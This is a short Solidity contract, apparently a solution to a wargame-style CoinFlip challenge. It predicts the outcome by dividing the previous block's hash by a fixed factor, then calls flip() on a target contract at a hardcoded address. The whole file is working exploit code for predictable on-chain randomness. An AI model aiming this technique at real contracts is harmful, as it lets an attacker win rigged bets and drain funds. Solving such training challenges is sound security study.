pragma solidity ^0.6.0;

import "./default.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract AttackFlip {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip flip = CoinFlip(0xec9Eb28674Ca163fA1cb3299808777CE61a01F59);

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        bool guess = (blockValue.div(FACTOR)) == 1 ? true : false;
        flip.flip(guess);
    }
}
